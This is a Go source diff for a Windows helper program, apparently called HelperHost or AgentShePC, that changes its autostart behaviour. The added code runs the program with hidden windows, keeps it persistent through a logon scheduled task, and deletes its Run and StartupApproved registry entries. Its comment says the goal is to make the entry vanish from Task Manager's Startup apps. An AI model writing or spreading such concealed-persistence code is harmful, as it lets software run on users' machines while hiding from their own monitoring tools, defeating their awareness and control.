@@ -14,29 +14,36 @@ func hideWindow(cmd *exec.Cmd) {
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
 }
 
+func clearStartupApproved(name string) {
+	key, err := registry.OpenKey(
+		registry.CURRENT_USER,
+		`Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run`,
+		registry.SET_VALUE,
+	)
+	if err == nil {
+		_ = key.DeleteValue(name)
+		_ = key.Close()
+	}
+}
+
 func installAutostart() string {
-	// Watchdog embedded in HelperHost.exe (--watch). No .vbs in the folder.
+	// Watchdog via scheduled task only — HKCU\Run appears in Task Manager "Startup apps".
 	tr := fmt.Sprintf("\"%s\" --watch", helperPath)
-	methods := []string{}
 	_ = exec.Command("schtasks", "/Delete", "/TN", "HelperHost", "/F").Run()
+	// Remove legacy Run entry + StartupApproved so the line disappears from demarrage.
+	if key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE); err == nil {
+		_ = key.DeleteValue("HelperHost")
+		_ = key.DeleteValue("AgentShePC")
+		_ = key.Close()
+	}
+	clearStartupApproved("HelperHost")
+	clearStartupApproved("AgentShePC")
+
 	r := exec.Command("schtasks", "/Create", "/TN", "HelperHost", "/TR", tr, "/SC", "ONLOGON", "/DELAY", "0001:00", "/RL", "LIMITED", "/F")
 	if r.Run() == nil {
-		methods = append(methods, "task")
+		return "task"
 	}
-	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
-	if err == nil {
-		_ = key.SetStringValue("HelperHost", tr)
-		_ = key.Close()
-		methods = append(methods, "run")
-	}
-	if len(methods) == 0 {
-		return "ok"
-	}
-	out := methods[0]
-	for i := 1; i < len(methods); i++ {
-		out += "+" + methods[i]
-	}
-	return out
+	return "ok"
 }
 
 func removeAutostart() {
@@ -52,4 +59,6 @@ func removeAutostart() {
 		_ = key.DeleteValue("AgentShePC")
 		_ = key.Close()
 	}
+	clearStartupApproved("HelperHost")
+	clearStartupApproved("AgentShePC")
 }
